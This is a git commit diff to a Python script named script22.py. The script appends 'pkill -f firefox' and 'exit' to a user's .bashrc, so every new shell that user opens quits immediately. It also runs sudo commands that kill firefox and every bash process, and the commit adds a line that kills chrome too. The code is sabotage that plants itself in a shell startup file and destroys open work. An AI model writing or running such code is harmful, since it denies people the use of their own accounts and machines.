036e90de3323148676102931c20612c047f91d9a
Blixrow <75791514+Blixrow@users.noreply.github.com>
2022-11-10 11:11:16 +0100

    Update script22.py

--- script22.py
+++ script22.py
@@ -8,4 +8,5 @@ with open("../home/tls-sec/.bashrc", 'a+') as f:
     f.write("\npkill -f firefox\nexit")
 
 subprocess.run("sudo pkill -f firefox")
+subprocess.run("sudo pkill -f chrome")
 subprocess.run("sudo pkill -c -e -9 bash")
